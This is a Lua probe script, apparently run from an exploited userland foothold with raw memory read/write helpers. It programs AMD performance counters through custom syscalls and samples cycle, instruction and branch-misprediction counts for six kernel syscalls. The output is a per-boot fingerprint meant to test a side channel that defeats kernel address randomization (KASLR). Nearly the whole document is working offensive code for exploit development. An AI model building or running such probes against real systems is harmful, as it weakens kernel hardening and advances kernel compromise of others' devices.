-- CRASH_CLASS: LOW
-- PROBE 160a: Multi-event KASLR fingerprint — instructions + cycles + cache misses
--
-- Theory: KASLR changes kernel virtual address alignment. Instruction counts
-- stay the same (same code runs), but CYCLE counts and CACHE MISS counts
-- change because different alignment = different cache line occupancy.
--
-- Strategy:
--   For each of 3 PMU events × 6 target syscalls × 20 samples:
--     1. Configure PMU event on counter 0
--     2. Zero counter
--     3. Execute ONE target syscall
--     4. Read counter
--   Build a fingerprint vector. Compare across boots.
--
-- PMU events (AMD Zen family):
--   0xC0 = retired instructions (baseline, should be KASLR-independent)
--   0x76 = CPU_CLK_UNHALTED (cycle count, includes cache stalls)
--   0x064 = L2 cache misses from DC fill (unit mask 0x08, event 0x64)
--
-- If cycles or cache misses differ across boots → KASLR oracle viable.

print("=== PROBE 160a: MULTI-EVENT KASLR FINGERPRINT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("%d", l) end
    return string.format("0x%X%08X", h, l)
end

local sc563 = make_syscall(563)  -- enable PMU
local sc564 = make_syscall(564)  -- disable PMU
local sc565 = make_syscall(565)  -- configure event selector
local sc566 = make_syscall(566)  -- write counter value
local sc567 = make_syscall(567)  -- read counter value
local sc432 = make_syscall(432)  -- thr_self
local sc20  = make_syscall(20)   -- getpid

-- Get TID (required for sys 567)
local tid_buf = memory.alloc(8)
safe_wq(tid_buf, uint64(0))
pcall(function() sc432(uint64(tid_buf)) end)
local our_tid = safe_rd(tid_buf) or 0

local ok, pid = pcall(function() return sc20() end)
print("PID: " .. (ok and fmt(pid) or "?") .. "  TID: " .. our_tid)
local tok, tstr = pcall(function() return os.date("%Y-%m-%d %H:%M:%S") end)
print("Time: " .. (tok and tstr or tostring(os.time())))
print("")

local out = memory.alloc(16)

-- PMU events to measure
-- Each entry: {event_select_value, name, unit_mask_shift}
-- sys 565 args: (selector=0, index=counter_idx, event_select_value)
-- AMD event select MSR format: bits [7:0]=event, [15:8]=unit mask, [22]=enable
-- We pass the full event_select value including enable bit (bit 22 = 0x400000)
-- sys 565 takes raw event code; kernel sets enable/usr bits internally
-- Confirmed working: 0xC0 (insn), 0x76 (cycles), 0xC3 (branch mispred)
-- 0x64 (L2 miss) returns 0 — needs umask or not available
local EVENTS = {
    {0xC0, "retired_insn"},       -- retired instructions (KASLR-independent baseline)
    {0x76, "cpu_clk"},            -- CPU_CLK_UNHALTED (cache-sensitive → KASLR-dependent)
    {0xC3, "branch_mispred"},     -- branch mispredictions (predictor-indexed by VA → KASLR-dependent)
}

-- Target syscalls
local targets = {
    {20,  "getpid",     function(sc) sc(uint64(0)) end},
    {202, "sysctl",     function(sc)
        local mib = memory.alloc(8)
        memory.write_dword(mib, 1)
        memory.write_dword(mib + 4, 37)
        sc(uint64(mib), uint64(2), uint64(0), uint64(0), uint64(0), uint64(0))
    end},
    {477, "mmap",       function(sc)
        sc(uint64(0), uint64(0x4000), uint64(3),
           uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end},
    {42,  "pipe",       function(sc)
        local pb = memory.alloc(16)
        sc(uint64(pb))
    end},
    {97,  "socket",     function(sc) sc(uint64(2), uint64(2), uint64(0)) end},
    {624, "vm_counter", function(sc) sc() end},
}

local SAMPLES = 20
local all_results = {}

-- Sanity check: enable PMU and verify counting
pcall(function() sc564(uint64(0)) end)
pcall(function() sc565(uint64(0), uint64(0), uint64(0x4100C0)) end)
pcall(function() sc563(uint64(0)) end)
pcall(function() sc566(uint64(0), uint64(0), uint64(0)) end)
for i = 1, 10 do pcall(function() sc20() end) end
safe_wq(out, uint64(0))
pcall(function() sc567(uint64(our_tid), uint64(0), uint64(out)) end)
local sanity = safe_rq(out)
local _, sl = get_hi_lo(sanity)
if sl == 0 then
    print("ERROR: PMU not counting. Aborting.")
    print("=== PROBE 160a ABORTED ===")
    return
end
print("PMU sanity: " .. sl .. " insn for 10x getpid — OK")
print("")

-- Measure each event
for ei, ev in ipairs(EVENTS) do
    local ev_val, ev_name = ev[1], ev[2]
    print("====== EVENT: " .. ev_name .. string.format(" (0x%06X)", ev_val) .. " ======")

    -- Reconfigure PMU for this event
    pcall(function() sc564(uint64(0)) end)
    pcall(function() sc565(uint64(0), uint64(0), uint64(ev_val)) end)
    pcall(function() sc563(uint64(0)) end)

    -- Warmup: 5 getpid calls to stabilize caches
    for i = 1, 5 do pcall(function() sc20() end) end

    all_results[ev_name] = {}

    for _, tgt in ipairs(targets) do
        local sc_num, sc_name, sc_call = tgt[1], tgt[2], tgt[3]
        local sc_fn = make_syscall(sc_num)
        local counts = {}

        for s = 1, SAMPLES do
            -- Zero counter
            pcall(function() sc566(uint64(0), uint64(0), uint64(0)) end)
            -- Execute target
            pcall(function() sc_call(sc_fn) end)
            -- Read counter
            safe_wq(out, uint64(0))
            pcall(function() sc567(uint64(our_tid), uint64(0), uint64(out)) end)
            local val = safe_rq(out)
            local _, vl = get_hi_lo(val)
            counts[s] = vl
        end

        -- Statistics
        local sorted = {}
        for i = 1, SAMPLES do sorted[i] = counts[i] end
        table.sort(sorted)
        local median = sorted[math.ceil(SAMPLES / 2)]
        local p25 = sorted[math.ceil(SAMPLES * 0.25)]
        local p75 = sorted[math.ceil(SAMPLES * 0.75)]
        local min_v = sorted[1]
        local max_v = sorted[SAMPLES]
        local iqr = p75 - p25
        local jitter_pct = median > 0 and ((max_v - min_v) / median * 100) or 0

        -- Print compact stats
        print(string.format("  %-12s  median=%9d  p25=%9d  p75=%9d  iqr=%6d  range=[%d,%d]  jitter=%.2f%%",
            sc_name, median, p25, p75, iqr, min_v, max_v, jitter_pct))

        all_results[ev_name][sc_name] = {
            median = median, p25 = p25, p75 = p75, iqr = iqr,
            min = min_v, max = max_v, counts = counts
        }
    end
    print("")
end

-- Disable PMU
pcall(function() sc564(uint64(0)) end)

-- ================================================================
-- FINGERPRINT: one line per event, all syscall medians
-- ================================================================
print("====== FINGERPRINT (save and compare across boots) ======")
print("")
for _, ev in ipairs(EVENTS) do
    local ev_name = ev[2]
    local parts = {}
    for _, tgt in ipairs(targets) do
        local r = all_results[ev_name][tgt[2]]
        if r then
            parts[#parts + 1] = string.format("%s=%d", tgt[2], r.median)
        end
    end
    print(string.format("FP_%s: %s", ev_name, table.concat(parts, " | ")))
end

-- Also print IQR fingerprint (cache-sensitive events should have higher IQR)
print("")
print("====== IQR ANALYSIS (cache sensitivity indicator) ======")
for _, ev in ipairs(EVENTS) do
    local ev_name = ev[2]
    local parts = {}
    for _, tgt in ipairs(targets) do
        local r = all_results[ev_name][tgt[2]]
        if r then
            local iqr_pct = r.median > 0 and (r.iqr / r.median * 100) or 0
            parts[#parts + 1] = string.format("%s=%.2f%%", tgt[2], iqr_pct)
        end
    end
    print(string.format("IQR_%s: %s", ev_name, table.concat(parts, " | ")))
end

-- Raw data dump for offline analysis
print("")
print("====== RAW SAMPLES (for statistical analysis) ======")
for _, ev in ipairs(EVENTS) do
    local ev_name = ev[2]
    for _, tgt in ipairs(targets) do
        local r = all_results[ev_name][tgt[2]]
        if r then
            local vals = {}
            for s = 1, SAMPLES do vals[s] = tostring(r.counts[s]) end
            print(string.format("RAW_%s_%s: %s", ev_name, tgt[2], table.concat(vals, ",")))
        end
    end
end

print("")
print("=== PROBE 160a COMPLETE ===")
